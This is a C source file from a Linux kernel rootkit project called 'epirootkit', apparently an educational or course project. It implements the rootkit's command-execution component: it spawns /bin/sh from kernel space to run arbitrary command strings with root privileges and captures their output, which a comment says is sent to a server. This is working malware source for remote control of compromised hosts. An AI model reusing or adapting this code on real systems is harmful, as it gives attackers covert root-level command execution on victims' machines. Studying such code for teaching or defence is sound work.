#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include "epirootkit.h"

struct exec_code_stds exec_result;

// Function prototypes
int init_exec_result(void);
int free_exec_result(void);
int exec_str_as_command(char *user_cmd);

/**
 * @brief Initializes the exec_result structure.
 * 
 * This function allocates memory for the std_out and std_err buffers
 * in the exec_result structure. It should be called before using
 * exec_str_as_command to ensure that the buffers are properly initialized.
 */
int init_exec_result(void){
	exec_result.code = 0;
	exec_result.std_out = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
	exec_result.std_err = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
	if (!exec_result.std_out || !exec_result.std_err) {
		ERR_MSG("exec_cmd: fail to initialize exec_result, memory allocation failed\n");
		if(exec_result.std_out)
			kfree(exec_result.std_out);
		if(exec_result.std_err)
			kfree(exec_result.std_err);
		return -ENOMEM;
	}
	return SUCCESS;
}

/**
 * @brief Frees the memory allocated for the exec_result structure.
 * 
 * This function should be called when the exec_result structure is no longer needed
 * to avoid memory leaks.
 */
int free_exec_result(void){
	if (exec_result.std_out) {
		kfree(exec_result.std_out);
		exec_result.std_out = NULL;
	}
	if (exec_result.std_err) {
		kfree(exec_result.std_err);
		exec_result.std_err = NULL;
	}

	DBG_MSG("epirootkit_exit: free_exec_result\n");

	return SUCCESS;
}

/**
 * @brief Executes a command string in user mode.
 * 
 * @param user_cmd A pointer to a null-terminated string containing the command to execute.
 * @return int - Returns 0 on success, -ENOMEM if memory allocation fails, or -ENOENT if the output file cannot be opened.
 */
int exec_str_as_command(char *user_cmd){
	struct subprocess_info *sub_info = NULL;							// Structure used to spawn a userspace process
	char *cmd = NULL;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	char *stdout_file = STDOUT_FILE;									// File to store stdout
	char *stderr_file = STDERR_FILE;									// File to store stderr
	int status = 0;														// Return code and number of bytes read

	// Allocate memory for the command string
	cmd = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
	if (!cmd)
		return -ENOMEM;


	// Check if the command contains redirection operators
	// Needed because we usually redirect stdout and stderr to /tmp/std.out and /tmp/std.err
	// If the user has specified redirection, we need to handle it
	char *redirect_stderr_add = strstr(user_cmd, "2>");		// Check for stderr redirection
	char *redirect_stdout_add = strstr(user_cmd, ">");		// Check for stdout redirection
	int user_redirect_stderr = redirect_stderr_add != NULL;
	int user_redirect_stdout = redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL;
	
	if (user_redirect_stderr && user_redirect_stdout)
		snprintf(cmd, STD_BUFFER_SIZE, "%s", user_cmd);
	else if (user_redirect_stderr)
		snprintf(cmd, STD_BUFFER_SIZE, "%s > %s", user_cmd, stdout_file); 
	else if (user_redirect_stdout)
		snprintf(cmd, STD_BUFFER_SIZE, "%s 2> %s", user_cmd, stderr_file);
	else
		snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2> %s", user_cmd, stdout_file, stderr_file);

	// Prepare the command arguments
	argv[2] = cmd;

	DBG_MSG("exec_str_as_command: executing command: %s\n", cmd);

	// Prepare to run the command
	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
	if (!sub_info) {
		kfree(cmd);
		return -ENOMEM;
	}

	// Execute the command and wait for it to finish
	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
	DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);

	// Retieve stdout and stderr
	int stdout_size = 0;
	int stderr_size = 0;
	char *stdout_content = read_file(stdout_file, &stdout_size);
	char *stderr_content = read_file(stderr_file, &stderr_size);
	if (!stdout_content || !stderr_content) {
		if (stdout_content)
			kfree(stdout_content);
		if (stderr_content)
			kfree(stderr_content);
		kfree(cmd);
		return -ENOENT;
	}

	// Update the exec_result structure with the command's output and return code
	exec_result.code = status;

	// Stock only the last STD_BUFFER_SIZE bytes of the output
	// Firsts (and all of them) are not useful since its has been sent to the server
	size_t stdout_copy_offset = stdout_size > STD_BUFFER_SIZE ? stdout_size - STD_BUFFER_SIZE : 0;
	size_t stderr_copy_offset = stderr_size > STD_BUFFER_SIZE ? stderr_size - STD_BUFFER_SIZE : 0;

	strncpy(exec_result.std_out, stdout_content + stdout_copy_offset, STD_BUFFER_SIZE - 1);
	strncpy(exec_result.std_err, stderr_content + stderr_copy_offset, STD_BUFFER_SIZE - 1);
	exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0';
	exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0';

	// Cleanup: free memory
	kfree(stdout_content);
	kfree(stderr_content);
	kfree(cmd);

	return SUCCESS;
}